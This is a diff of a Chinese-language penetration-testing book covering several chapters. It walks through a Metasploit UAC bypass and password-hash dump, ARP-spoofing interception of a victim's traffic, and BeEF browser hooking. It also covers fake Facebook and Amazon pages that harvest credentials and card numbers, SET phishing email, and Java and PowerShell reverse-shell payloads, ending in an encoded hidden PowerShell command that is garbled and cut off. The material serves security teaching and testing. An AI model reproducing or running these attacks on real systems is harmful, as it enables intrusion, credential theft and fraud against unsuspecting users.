-太棒了，你可以看到该用户是管理员组的成员，UAC 绕过成功了，并创建了一个新会话。现在如果我们再次尝试“getuid”，它仍然显示是 Fred。但如果我们运行“getsystem”就成功了！
+![](img/ff9cd19afe449ae54278ee429e668a6f_101.png)
 
-```
+2. 现在需要使用 `bypassuac` exploit：
+
+`msf exploit(handler) > exploit/windows/local/bypassuac`
+
+3. 输入`show options`查看我们需要提供的选项：
+
+![](img/ff9cd19afe449ae54278ee429e668a6f_102.png)
+
+4. 唯一的选项是`set session`。在此情况下设置为我们的活动会话 1：
+
+`msf exploit(handler) > set session 1`
+
+5. 最后输入`exploit`运行 `bypassuac` 模块：
+
+![](img/ff9cd19afe449ae54278ee429e668a6f_102.png)
+
+太棒了，你可以看到该用户是管理员组的成员，UAC 绕过成功了，并创建了一个新会话。现在如果我们再次尝试`getuid`，它仍然显示是 Fred。但如果我们运行`getsystem`就成功了！
+
+```text
 meterpreter > getuid
 Server username: WIN-COMPUTER\Fred
 meterpreter > getsystem
@@ -2469,17 +2572,17 @@ got system (via technique 1).
 meterpreter >
 ```
 
-现在如果我们输入“getuid”，将证明我们确实拥有 System 权限，或者从 Windows 的角度来看是“god 权限”。
+现在如果我们输入`getuid`，将证明我们确实拥有 System 权限，或者从 Windows 的角度来看是“god 权限”。
 
-```
+```text
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter >
 ```
 
-现在，如果我们用 `run post/windows/gather/hashdump` 命令转储密码哈希值：
+现在，如果我们用`run post/windows/gather/hashdump`命令转储密码哈希值：
 
-```
+```text
 meterpreter > run post/windows/gather/hashdump
 [*] 正在获取 boot key...
 [*] 正在通过 SYKEY ba8bf7a3b510157f211cb63b71dbaa 计算 hboot key...
@@ -2492,11 +2595,11 @@ Bob:"my name"
 George:"secured"
 ```
 
-上面的 hashdump 显示的第一部分 Alice、Bob 和 George 显示了他们在创建密码时设置的登录密码提示。
+上面的 `hashdump` 显示的第一部分 Alice、Bob 和 George 显示了他们在创建密码时设置的登录密码提示。
 
 最后部分显示系统的实际哈希值：
 
-```
+```text
 [*] 正在转储密码哈希...
 
 Administrator:500:aad3b435b51044ead3b435b51044ae:31d6fe0d16ae9931b73c59d7e0c08c0
@@ -2507,11 +2610,7 @@ Bob:102:aad3b435b51044ead3b435b51044ae:9de6a7e9a98da72150d15263f56febd6
 George:103:aad3b435b51044ead3b435b51044ae:317a9aa1b1069208b4ccb69718adf6f7
 ```
 
-
-
-
-
-## 第 11 章 - 数据包捕获与中间人攻击
+# 第 11 章：数据包捕获与中间人攻击
 
 ## 引言
 
@@ -2521,7 +2620,7 @@ George:103:aad3b435b51044ead3b435b51044ae:317a9aa1b1069208b4ccb69718adf6f7
 
 在本节中，我们将通过两个截然不同的过程来查看网络数据包。
 
-对于第一个过程，我们将对局域网上的一个系统使用中间人攻击，涉及 `arpspoof`、`urlsnarf` 和 `Driftnet` 命令。通过使用这些命令，我们可以查看目标正在哪个网站，并显示目标正在查看的每一幅图像。
+对于第一个过程，我们将对局域网上的一个系统使用中间人攻击，涉及`arpspoof`、`urlsnarf`和`Driftnet`命令。通过使用这些命令，我们可以查看目标正在哪个网站，并显示目标正在查看的每一幅图像。
 
 其次，我们将介绍如何通过 Metasploit 会话（session）在远程机器上运行数据包捕获。然后，我们将在 Wireshark 和 Xplico 中查看捕获的信息以寻找人工痕迹。
 
@@ -2535,19 +2634,19 @@ George:103:aad3b435b51044ead3b435b51044ae:317a9aa1b1069208b4ccb69718adf6f7
 
 从目标系统发往互联网的所有流量都会先重定向到我们的机器，然后由我们的机器捕获并转发到网络。从互联网发往目标机器的所有信息都会首先通过我们的系统，再次以便我们可以进行审查，然后转发到目标系统。
 
-我们通过修改路由器和目标系统上的 ARP（地址解析协议）表来实现这一点。ARP 表告诉系统 IP 地址实际上位于哪个物理 MAC 地址。因此，我们告诉目标机器我们是互联网路由器，并告诉路由器我们是
+我们通过修改路由器和目标系统上的 ARP（地址解析协议）表来实现这一点。ARP 表告诉系统 IP 地址实际上位于哪个物理 MAC 地址。因此，我们告诉目标机器我们是互联网路由器，并告诉路由器我们是目标机器。
 
-- 1. 我们可以使用“arpspoof”程序轻松修改 ARP 表。但首先，我们需要通过运行以下命令来开启 IP 转发（IP forwarding）：
+1. 我们可以使用`arpspoof`程序轻松修改 ARP 表。但首先，我们需要通过运行以下命令来开启 IP 转发（IP forwarding）。
 
-- 2. 现在我们需要运行 `arpof` 命令。为了这样做，我们需要像下面提供网络接口（`-i`）、目标系统（`-t`）和路由器地址：
+2. 现在我们需要运行`arpof`命令。为了这样做，我们需要像下面提供网络接口（`-i`）、目标系统（`-t`）和路由器地址：
 
-```
+```bash
 root@Kali:~# arpof -i eth0 -t 192.168.198.132 192.168.198.2
 ```
 
-（你可能需要运行反转 IP 地址的反向命令来设置反向连接。在 VMWare 主机上反转似乎不起作用，但我只需使用上面的单向命令就捕获了所有流量）
+（你可能需要运行反转 IP 地址的反向命令来设置反向连接。在 VMWare 主机上反转似乎不起作用，但我只需使用上面的单向命令就捕获了所有流量。）
 
-Arpspoof 然后应该开始发送修改后的 MAC 地址。
+`Arpspoof`然后应该开始发送修改后的 MAC 地址。
 
 现在让我们看看能从目标系统捕获到什么。
 
@@ -2555,16 +2654,16 @@ Arpspoof 然后应该开始发送修改后的 MAC 地址。
 
 让我们先查找目标正在浏览的 URL 地址。
 
-- 3. 简单地输入 `urlsnarf -i eth0`
+3. 简单地输入`urlsnarf -i eth0`：
 
-```
+```text
 root@kali:-# urlsnarf -i eth0
 urlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]
 ```
 
 当用户浏览网页时，我们将看到所有的 URL 流量：
 
-```
+```text
 urlsnarf: listening on eth0 [tcp port 80
 192.168.198.132 - [08/Nov/2013:21:49:06 -0500]
 a.net/pub/mozilla.org/firefox/releases/25/update/
@@ -2583,26 +2682,27 @@ Firefox/24.0"
 
 ## 使用 Driftnet 查看捕获的图像
 
-文本很有趣，但你也可以看到来自访问的 URL 的图像。要这样做，只需使用“Driftnet”。
+文本很有趣，但你也可以看到来自访问的 URL 的图像。要这样做，只需使用`Driftnet`。
 
-- 4. 简单地配合你想要的接口（`-i`）输入命令 `driftnet`，如下所示：
+4. 简单地配合你想要的接口（`-i`）输入命令`driftnet`，如下所示：
 
-```
+```bash
 root@kali:-# driftnet -i eth0
 ```
 
 Driftnet 窗口会在你的 Kali 界面上打开。将其最大化以便更容易查看。
 
-- 5. 现在回到目标计算机并开始浏览网页。
+5. 现在回到目标计算机并开始浏览网页。
 
 你应该开始看到图像出现在你的 Kali 系统上。例如，如果目标用户访问了 Kali Linux 博客页面，网站上的图像应该开始显示。
 
-因此，在目标系统上他们将看到这些图像：(img/ffcd19afe449ae54278ee268)
+因此，在目标系统上他们将看到这些图像：
 
-
-
+(img/ffcd19afe449ae54278ee268)
 
 如果用户连接到任何未加密的 FTP 会话（如所示），你将可以看到整个会话。
+
+
 
 要以明文形式查看整个会话，请右键点击源 IP 并点击“Follow TCP Stream”（跟踪 TCP 流）。你将看到如下所示的流内容：
 
@@ -2618,7 +2718,7 @@ Wireshark 是分析网络通信的优秀工具，你可以用它做很多事情�
 
 Xplico 已经添加到 Kali 存储库中，但你的系统中可能尚未安装。它是一个基于 Web 的界面，因此为了启动它，你需要同时启动 Apache Web 服务器和 Xplico 服务器。
 
-在 Kali 菜单的“System Services”（系统服务）下，你应该能看到出 HTTP (Apache) 和 Xplico。
+在 Kali 菜单的“System Services”（系统服务）下，你应该能看到 HTTP（Apache）和 Xplico。
 
 如果列表中没有 Xplico，你需要安装它。要进行安装，请运行以下命令：
 
@@ -2628,71 +2728,72 @@ root@kali:~# apt-get install xplico
 
 完成后，我们只需要启动服务即可。
 
-- 1. 如果 Apache Web 服务器尚未运行，请启动它。
-  Kali>System Services>HTTP>Apache 2 Start
+1. 如果 Apache Web 服务器尚未运行，请启动它。
 
-- 2. 在“System Services”菜单下启动 Xplico 服务：
+   `Kali>System Services>HTTP>Apache 2 Start`
 
-![](img/ff9cd19afe449ae54278ee429e668a6f_110_0.png)
+2. 在“System Services”菜单下启动 Xplico 服务：
+
+   ![](img/ff9cd19afe449ae54278ee429e668a6f_110_0.png)
 
 一旦 Xplico 启动，你就可以通过 Web 界面访问它。
 
-- 3. 打开浏览器并访问“localhost:9876”
+3. 打开浏览器并访问`localhost:9876`。
 
-![](img/ff9cd19afe449ae54278ee429e668a6f_110_1.png)
+   ![](img/ff9cd19afe449ae54278ee429e668a6f_110_1.png)
 
-- 4. 使用用户名和密码“xplico”登录。
+4. 使用用户名和密码“xplico”登录。
 
-![](img/ff9cd19afe449ae54278ee429e668a6f_110_2.png)
+   ![](img/ff9cd19afe449ae54278ee429e668a6f_110_2.png)
 
-- 5. 点击“New Case”（新建案例）
+5. 点击“New Case”（新建案例）。
 
-![](img/ff9cd19afe449ae54278ee429e668a6f_110_3.png)
+   ![](img/ff9cd19afe449ae54278ee429e668a6f_110_3.png)
 
-- 6. 现在点击“Uploading PCAP capture file/s”（上传 PCAP 捕获文件）
+6. 现在点击“Uploading PCAP capture file/s”（上传 PCAP 捕获文件）。
 
-- 7. 给它命名名称并点击“Create”（创建）
+7. 给它命名名称并点击“Create”（创建）。
 
 # 数据采集 PCAP 捕获文件/s 实时采集
 
 | 案例名称 | 测试 |
-| :--- | :--- |
+| --- | --- |
 | 外部引用 | |
 | 创建 | |
 
 8. 在 Case 下，点击“New Session”（新建会话）：
 
-![](img/ff9cd19afe449ae54278ee429e668a6f_111_0.png)
+   ![](img/ff9cd19afe449ae54278ee429e668a6f_111_0.png)
 
 9. 给会话命名，然后点击“Create”（创建）：
 
-![](img/ff9cd19afe449ae54278ee429e668a6f_111_1.png)
+   ![](img/ff9cd19afe449ae54278ee429e668a6f_111_1.png)
 
 10. 现在点击会话名称。
 
-11. 主会话桌面出现
+11. 主会话桌面出现。
 
 12. 在“Pcap set”菜单部分下，浏览并上传你的 pcap 文件：
 
-![](img/ff9cd19afe449ae54278ee429e668a6f_111_2.png)
+    ![](img/ff9cd19afe449ae54278ee429e668a6f_111_2.png)
 
 文件将被上传到 Xplico，几秒钟到几分钟后（取决于你的 Pcap 文件大小），你将看到如下结果：
 
 | HTTP | MMS | Emails (邮件) |
-| :--- | :--- | :--- |
+| --- | --- | --- |
 | Post: 25 | Number: 0 | Received: 0 |
 | Get: 471 | Contents: 0 | Sent: 0 |
 | Video: 2 | Video: 0 | Unread: 0/0 |
 | Images: 247 | | |
 
 | Facebook Chat/Patalk | IRC/Patalk ExpMsn | Dns - Arp: Icmp4 |
-| :--- | :--- | :--- |
+| --- | --- | --- |
 | Users: 0 | DNS res: 225 | |
 | Chats: 0/0 | Server: 0 | ARP/ICMP6: 37/4 |
 | | Channels: 0/0 | |
 
 | Feed (RSS & Atom) | Printed Files (打印文件) | Telnet/Syslog |
-| :--- | :--- | :--- |
+| --- | --- | --- |
 | Number: 0 | Pdf: 0 | Connections: 0/0 |
 | | | |
 
@@ -2720,9 +2821,6 @@ root@kali:~# apt-get install xplico
 
 在第二部分，我们学习了如何将一个被攻击的系统变为……
 
-
-
-
 使用这些命令，我们可以从受害者的浏览器中获取信息，甚至更改他们看到的内容。
 
 例如，如果我们想尝试对他们进行社交工程攻击并获取他们的 Facebook 凭据，可以进入 Social Engineering（社交工程）选项卡并点击“Pretty Thief”。然后点击“Execute”（执行）。
@@ -2740,23 +2838,33 @@ data: Sat Jun 29 2013 16:48:32 GMT-0400 (EDT)
 answer=testuser@test.com ILuvSecurePasswords!
 ```
 
-用户名：**testuser@test.com**，密码：**ILuvSecurePasswords**！
+用户名：`testuser@test.com`，密码：`ILuvSecurePasswords`！
 
 我们还可以尝试这种看起来像 Amazon 的攻击来获取信用卡号：
 
 您的卡详情已过期，请输入新的信用卡凭据以继续购物。
+
 更改您的付款方式不会影响您已经下过的订单。
+
 您的账户-添加信用卡或借记卡
 
 编辑您的付款方式：
+
 持卡人姓名：
+
 过期日期：
+
 卡号：
 
-## BeEF 的功能远不止弹窗。你可以获取受害者所在网页的 HTML 代码：
+## BeEF 的功能远不止弹窗
 
-- 1 Tue Jul 02 2013 21:24:08 GMT-0400 (EDT)
+你可以获取受害者所在网页的 HTML 代码：
+
+```text
+1 Tue Jul 02 2013 21:24:08 GMT-0400 (EDT)
+
 data: head<meta http-equiv="content-type" content="text/html; charset="UTF-8"><title>BeEF Project</title><link rel="stylesheet" href="style.css"><body style="margin:0; padding:0;"><iframe style="display:none; background-color:white; width:100%; height:100%; position:absolute; top:0; left:0;" src="http://www.beefproject.com/"><script src="jquery-1.5.min.js"></script><script>function friends(){$(document).on('click',function(){showhamper()});$(document).hide().show(hamper());var command=modlSrc;<script src=""+window.protocol+window.location.host+"/hook.js" type="javascript/javascript"></document.write(command(modlSrc));<script src="http://192.168.1.102:8080/hook.php" type="text/html"><div id="content">Awesome Beef images from: http://www.flickr.com/photos/delete/465764804/jpg and http://www.flickr.com/photos/delete/395443219/jpg - "logo"><div class="banner">欢迎来到屠夫店！您的肉类来源。请随时查看我们的样本，订阅我们的邮件列表或购买我们的特色牛肉礼篮！div>div class="normal"><button type="button">我们的肉类朋友!</button><button type="button">Your Pie-execute command
+```
 
 然后实时更改页面上的任何链接，而用户完全毫无察觉，将其指向你想让受害者去往任何地方。
 
@@ -2764,7 +2872,7 @@ data: head<meta http-equiv="content-type" content="text/html; charset="UTF-8"><t
 
 以下是将页面上所有链接更改为达拉斯牛仔队网站后的网页源码：
 
-```
+```text
 data: head<meta http-equiv="Content-Type" content="text/html;
 <a href="http://dallascboys.com/">/Slash</a>
 <a href="http://dallascboys.com/">/Dallas</a>
@@ -2773,7 +2881,7 @@ data: head<meta http-equiv="Content-Type" content="text/html;
 
 当然，攻击者通常不会将他们引导到体育网站，而可能是一个恶意网站，或者是 Amazon 或 Facebook 的完全伪造。
 
-你还可以发送自定义的 Javascript，甚至将其与 Metasploit 结合来尝试获取远程 shell。
+你还可以发送自定义的 JavaScript，甚至将其与 Metasploit 结合来尝试获取远程 shell。
 
 你可以看到，攻击者控制浏览器的后果是非常糟糕的。
 
@@ -2805,13 +2913,13 @@ Windows 7 和 8 的基础安全性要比 Windows XP 好得多。
 
 社交工程攻击有许多类型，最常见的包括：
 
--  网络钓鱼 (Phishing)：这是最常见的社交工程类型。攻击者发送伪装来自可靠来源的欺诈邮件来窃取敏感信息。
-- 鱼叉式钓鱼 (Spear phishing)：这是一种针对性的钓鱼，攻击者针对特定的个人或组织。
-- 捕鲸攻击 (Whaling)：这是一种针对高层高管（如 CEO、CFO 和 COO）的鱼叉式钓鱼攻击。
-- 假借攻击 (Pretexting)：在假设攻击中，攻击者创建一个虚构的场景来获得受害者的信任。
-- 尾随 (Tailgating)：发生在攻击者跟随授权人员进入限制区域。
-- 诱饵 (Baiting)：这涉及在公共场所留下受感染的设备（如 USB 盘），让有人捡到。
-- 等价交换 (Quid pro quo)：这涉及攻击者提供服务或利益以换信息或访问权限。
+- 网络钓鱼（Phishing）：这是最常见的社交工程类型。攻击者发送伪装来自可靠来源的欺诈邮件来窃取敏感信息。
+- 鱼叉式钓鱼（Spear phishing）：这是一种针对性的钓鱼，攻击者针对特定的个人或组织。
+- 捕鲸攻击（Whaling）：这是一种针对高层高管（如 CEO、CFO 和 COO）的鱼叉式钓鱼攻击。
+- 假借攻击（Pretexting）：在假设攻击中，攻击者创建一个虚构的场景来获得受害者的信任。
+- 尾随（Tailgating）：发生在攻击者跟随授权人员进入限制区域。
+- 诱饵（Baiting）：这涉及在公共场所留下受感染的设备（如 USB 盘），让有人捡到。
+- 等价交换（Quid pro quo）：这涉及攻击者提供服务或利益以换信息或访问权限。
 - 基于社交媒体的攻击：这是利用社交媒体平台收集目标信息并构思具有说服力的攻击的手段。
 
 以下是一些社交工程的例子：
@@ -2824,7 +2932,7 @@ Windows 7 和 8 的基础安全性要比 Windows XP 好得多。
 
 ### 资源
 
-- http://www.socialengineer.org/
+- `http://www.socialengineer.org/`
 
 ## 社交工程防御
 
@@ -2832,11 +2940,7 @@ Windows 7 和 8 的基础安全性要比 Windows XP 好得多。
 
 你可以教学、指导，甚至留下提醒信息和海报，但员工可能仍然不遵守政策。因此，当涉及到社交工程攻击时，最好的办法是手动测试，看看你的公司是否真的准备好了。
 
-
-
-
-
-# 第14 章 – 社会工程工具包 (SET)
+# 第14章 – 社会工程工具包（SET）
 
 ## 引言
 
@@ -2848,31 +2952,31 @@ Windows 7 和 8 的基础安全性要比 Windows XP 好得多。
 
 ## 启动 SET
 
-从 Kali 主菜单启动 SET：Linux > Exploitation Tools > Social Engineering Toolkit
+从 Kali 主菜单启动 SET：`Linux > Exploitation Tools > Social Engineering Toolkit`
 
-## 批量邮件发送器 (Mass Emailer)
+## 批量邮件发送器（Mass Emailer）
 
 社会工程师攻击网络的一种方法是向大量地址发送大量邮件，看看谁会回复或运行随附的恶意附件。SET 自带了批量邮件发送器（Mass Emailer），选择“Engineering Attacks”（工程攻击）。
 
 批量邮件发送器有两个选项，第一个是向某个人发送电子邮件。第二个选项允许你导入列表，并将其发送给列表中的任意人数。你想执行什么：
 
-- 1. 邮件攻击 (Email Attack)
-- 2. 批量邮件发送器 (Mass Mailer)
-- 3. 返回主菜单
+1. 邮件攻击（Email Attack）
+2. 批量邮件发送器（Mass Mailer）
+3. 返回主菜单
 
 在这个示例中，我们只发送一封。
 
-- 1. 使用 Gmail 账户发送邮件。
-- 2. 使用你自己的服务器或中继。
-- 4. 输入目标地址：
-- 5. 接下来选择使用 Gmail 账户或其他服务器。
-- 6. 现在选择用于邮件“发件人”行的行的伪造名称：
-- 7. 接下来 SET 会询问你的账户密码。
-- 8. 在提示“将此消息标记为高优先级吗？”时输入“yes”。
-- 9. 接下来输入邮件主题。
-- 10. 在提示“以 html 还是纯文本格式发送消息？”时输入“P”。
+1. 使用 Gmail 账户发送邮件。
+2. 使用你自己的服务器或中继。
+3. 输入目标地址：
+4. 接下来选择使用 Gmail 账户或其他服务器。
+5. 现在选择用于邮件“发件人”行的行的伪造名称：
+6. 接下来 SET 会询问你的账户密码。
+7. 在提示“将此消息标记为高优先级吗？”时输入“yes”。
+8. 接下来输入邮件主题。
+9. 在提示“以 html 还是纯文本格式发送消息？”时输入“P”。
 
-```
+```text
 set phishing> MrCEO@SomeDomain.com
 set phishing> Important Update
 set phishing> ITDepartment@SomeDomain.com
@@ -2890,30 +2994,32 @@ set phishing> 9
 set phishing> 10
 ```
 
-现在输入虚假信息，最好是那种能诱导我们的受害者点击恶意链接的消息。在实际防御中，这可以只是一个网页，记录下欺骗访问该页面的用户的 IP 地址。这样，作为安全团队，我们就知道组织需要加强对邮件风险的教育了。完成后后，输入“END”。
+现在输入虚假信息，最好是那种能诱导我们的受害者点击恶意链接的消息。在实际防御中，这可以只是一个网页，记录下欺骗访问该页面的用户的 IP 地址。这样，作为安全团队，我们就知道组织需要加强对邮件风险的教育了。完成后，输入“END”。
 
 ## SET JavaInjector 攻击
 
-上面的消息显然是虚假的，但类似这样的（配上更可信力的内容）可以用来测试员工检测、抵抗和报告钓鱼尝试的能力。到目前，我们只是发送了一封可能将某人引导到虚假网站的假邮件。但如果我们制作一个提供带有陷阱脚本的虚假网站呢？如果用户允许脚本运行，是否能与用户创建一个远程 shell呢？
+上面的消息显然是虚假的，但类似这样的（配上更可信力的内容）可以用来测试员工检测、抵抗和报告钓鱼尝试的能力。到目前，我们只是发送了一封可能将某人引导到虚假网站的假邮件。但如果我们制作一个提供带有陷阱脚本的虚假网站呢？如果用户允许脚本运行，是否能与用户创建一个远程 shell 呢？
 
-JavaInjector 攻击利用了基于 PowerShell 的攻击绕过杀毒软件的能力并结合 Java 程序。我们将使用 SET 创建一个虚假网站提供带有陷阱的 Java 程序。如果用户允许程序运行，我们就获得了系统的远程会话。在本示例中，我们将使用 Windows 7 系统作为“目标”。
 
-从 SET 主菜单：
+
+`JavaInjector`攻击利用了基于 `PowerShell` 的攻击绕过杀毒软件的能力并结合 `Java` 程序。我们将使用 `SET` 创建一个虚假网站提供带有陷阱的 `Java` 程序。如果用户允许程序运行，我们就获得了系统的远程会话。在本示例中，我们将使用 `Windows 7` 系统作为“目标”。
+
+从 `SET` 主菜单：
 
 - 1. 选择 1，“Social-Engineering Attacks”（社会工程攻击）。
 - 2. 接下来选择 2，“Website Attack”（网站攻击）。
 - 3. 然后选择 1，“Java Applet Method”（Java Applet 方法）。
 
-这将创建一个带有后门 shell 的 Java 程序。这里还有其他可选的攻击选项。Metasploit 攻击使用 Metasploit 浏览器漏洞攻击客户端系统。Credential Harvester（凭据收割器）攻击非常巧妙，因为它会克隆现有网站（如 Facebook），然后存储输入到其中的任何凭据。TabNabbing 如果客户端打开了大量浏览器窗口时效果非常好，它会等待一段时间，将其中一个标签页切换到 SET 创建的页面。Web-Jacking（网页劫持）攻击使用 iframe 替换使恶意链接看起来合法。最后，Multi-Attack（组合攻击）结合了上述几种攻击。
+这将创建一个带有后门 `shell` 的 `Java` 程序。这里还有其他可选的攻击选项。`Metasploit` 攻击使用 `Metasploit` 浏览器漏洞攻击客户端系统。`Credential Harvester`（凭据收割器）攻击非常巧妙，因为它会克隆现有网站（如 `Facebook`），然后存储输入到其中的任何凭据。`TabNabbing` 如果客户端打开了大量浏览器窗口时效果非常好，它会等待一段时间，将其中一个标签页切换到 `SET` 创建的页面。`Web-Jacking`（网页劫持）攻击使用 `iframe` 替换使恶意链接看起来合法。最后，`Multi-Attack`（组合攻击）结合了上述几种攻击。
 
-- 4. 接下来选择 1，“Web Templates”（网页模板）让 SET 创建一个通用网页。或使用选项 2，“Site Cloner”（站点克隆）允许 SET 使用现有网页作为攻击网页的模板。
-- 5. NAT/端口转发 – 根据你的系统是否使用不同的外部 IP 地址选择 yes 或 no。通常如果使用内部测试实验室，选择“no”足够了。
-- 6. 输入你的 SET 机器的 IP 地址。如果不确定 IP 地址，可以打开另一个终端窗口输入“ifconfig”。
+- 4. 接下来选择 1，“Web Templates”（网页模板）让 `SET` 创建一个通用网页。或使用选项 2，“Site Cloner”（站点克隆）允许 `SET` 使用现有网页作为攻击网页的模板。
+- 5. `NAT`/端口转发 – 根据你的系统是否使用不同的外部 `IP` 地址选择 `yes` 或 `no`。通常如果使用内部测试实验室，选择“no”足够了。
+- 6. 输入你的 `SET` 机器的 `IP` 地址。如果不确定 `IP` 地址，可以打开另一个终端窗口输入“`ifconfig`”。
 - 7. 选择模板 - 现在选择 1，“Java Required”（需要 Java）。注意其他可用选项。
-- 8. 选择你交付的有效负载（payload），我通常选择 14，“ShellCode Alphanum Shellcode”（字母数字码，这很有趣，因为它从内存运行，从不接触硬盘，可以有效绕过某些杀毒软件）或 15，“PyInjector Shellcode”。现在我们直接使用选项 15，“PyInjector Shellcode Injection”，并使用默认端口 443。
+- 8. 选择你交付的有效负载（`payload`），我通常选择 14，“ShellCode Alphanum Shellcode”（字母数字码，这很有趣，因为它从内存运行，从不接触硬盘，可以有效绕过某些杀毒软件）或 15，“PyInjector Shellcode”。现在我们直接使用选项 15，“PyInjector Shellcode Injection”，并使用默认端口 443。
 - 9. 接下来选择要注入的负载，让我们选择第一个选项，“Windows Meterpreter Reverse TCP”。
 
-现在 SET 已已准备就绪并执行几项操作。它创建并加密 PowerShell 注入代码、创建网站、加载 Metasploit 并启动等待连接的监听服务。完成后，你的屏幕看起来像这样：
+现在 `SET` 已已准备就绪并执行几项操作。它创建并加密 `PowerShell` 注入代码、创建网站、加载 `Metasploit` 并启动等待连接的监听服务。完成后，你的屏幕看起来像这样：
 
 ```
 # Preparing pyinjector for delivery...
@@ -2928,8 +3034,6 @@ Base
 # Preparing pyinjector for delivery...
 # Preparing website for pyinjector shellcode injection...
 ```
-
-
 
 ```
 msfexploit (handler) - sessions - 1
@@ -2942,7 +3046,7 @@ Copyright (C) 2009 Microsoft Corporation. All rights reserved.
 C:\Users\Client\Desktop\
 ```
 
-连接成功后，你可以使用任何内置的 Meterpreter 命令，或者使用 Linux 命令来浏览远程电脑，或者简单地运行 "shell" 即可获得一个远程窗口命令行 shell：
+连接成功后，你可以使用任何内置的 `Meterpreter` 命令，或者使用 `Linux` 命令来浏览远程电脑，或者简单地运行 "`shell`" 即可获得一个远程窗口命令行 `shell`：
 
 ```
 msfexploit (handler) - sessions - 1
@@ -2959,21 +3063,21 @@ C:\Users\Client\Desktop\
 
 # 社会工程工具包：PowerShell 攻击者向量
 
-基于 Java 的 PowerShell 攻击非常强大，但如果目标没有运行 Java，或者我们无法诱骗他们访问我们的 SET 页面怎么办？另一种社会工程尝试是诱骗用户运行我们发送给他们的文件。
+基于 `Java` 的 `PowerShell` 攻击非常强大，但如果目标没有运行 `Java`，或者我们无法诱骗他们访问我们的 `SET` 页面怎么办？另一种社会工程尝试是诱骗用户运行我们发送给他们的文件。
 
-因此，让我们来看看如何创建一个 PowerShell shellcode 文件并将其发送给目标。如果我们能诱骗目标运行 shellcode，或者让它自动运行，我们就能获得与该机器的远程连接。
+因此，让我们来看看如何创建一个 `PowerShell` `shellcode` 文件并将其发送给目标。如果我们能诱骗目标运行 `shellcode`，或者让它自动运行，我们就能获得与该机器的远程连接。
 
-在本节中，我们使用 SET 的 PowerShell 攻击者向量来创建一个 PowerShell 脚本，该脚本在目标系统运行时将回连到我们的 Kali 系统并为我们的系统创建一个远程 shell。我们还将设置 SET 来寻找这些入站连接。
+在本节中，我们使用 `SET` 的 `PowerShell` 攻击者向量来创建一个 `PowerShell` 脚本，该脚本在目标系统运行时将回连到我们的 `Kali` 系统并为我们的系统创建一个远程 `shell`。我们还将设置 `SET` 来寻找这些入站连接。
 
-- 1. 启动 SET 并选择选项数字 1，“Social-Engineering Attacks”（社会工程攻击）。
+- 1. 启动 `SET` 并选择选项数字 1，“Social-Engineering Attacks”（社会工程攻击）。
 - 2. 选择选项 10，“PowerShell Attacker Vector”（PowerShell 攻击者向量）。
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_129_0.png)
 
 - 3. 选择下一个数字 1，“PowerShell Alphanumeric Shellcode Injector”（PowerShell 字母数字 shellcode 注入器）。
-- 4. 现在只需输入 Kali 系统的 IP 地址以及你想用于反向连接的端口-
+- 4. 现在只需输入 `Kali` 系统的 `IP` 地址以及你想用于反向连接的端口-
 
-最后 SET 会询问你是否想要创建监听器服务，当受害者运行代码时，SET 将准备好接受远程连接。在提示符处输入 "yes"。
+最后 `SET` 会询问你是否想要创建监听器服务，当受害者运行代码时，`SET` 将准备好接受远程连接。在提示符处输入 "`yes`"。
 
 ```
 # IP address for the listener: 192.168.1.226
@@ -2985,7 +3089,7 @@ C:\Users\Client\Desktop\
 # Do you want to start the listener now [yes/no]: : yes
 ```
 
-SET 现在会创建利用代码，如果你选择了启动监听器，它会在 Metasploit 中启动监听器服务并等待入站连接：
+`SET` 现在会创建利用代码，如果你选择了启动监听器，它会在 `Metasploit` 中启动监听器服务并等待入站连接：
 
 ```
 / Processing /root/set/reports/powershell.rc for ERB directives.
@@ -3000,20 +3104,24 @@ Establishing reverse handler on 0.0.0.0:443
 [*] session 1 opened (more you are to hear)
 ```
 
-现在我们只需要将利用代码发送到受害者系统。SET 会创建利用代码并将其放入 "/root/set/reports/powershell/" 目录。
+现在我们只需要将利用代码发送到受害者系统。`SET` 会创建利用代码并将其放入 "`/root/set/reports/powershell/`" 目录。
 
-保持 SET 窗口打开并打开另一个终端 shell。
+保持 `SET` 窗口打开并打开另一个终端 `shell`。
 
-导航到 powershell 目录，你将在文本文件中看到 PowerShell 注入代码，在我们的示例中是 "x86_powershell_injection.txt"。
+导航到 `powershell` 目录，你将在文本文件中看到 `PowerShell` 注入代码，在我们的示例中是 "`x86_powershell_injection.txt`"。
 
-你可以使用 "cat" 命令文件来显示其内容：
+你可以使用 "`cat`" 命令文件来显示其内容：
 
-```
+
+
+```text
 root@kali:~# cd /root/set/reports/powershell/
 root@kali:~# ls
 root@kali:~# cat /root/set/reports/powershell/x86_powershell_injection.txt
-powershell -nop windows -hidden -nonenc JABAAAAAElEG8sAJICAMAPAGACWAgAZABQABwAAAEABAA84AGAZUAdABlAGAZAHAGAGABAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHIAqAHqqAHqqAHqqAHqqAHqqAHqqAHqqAHqqAHqqAHqqAHqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq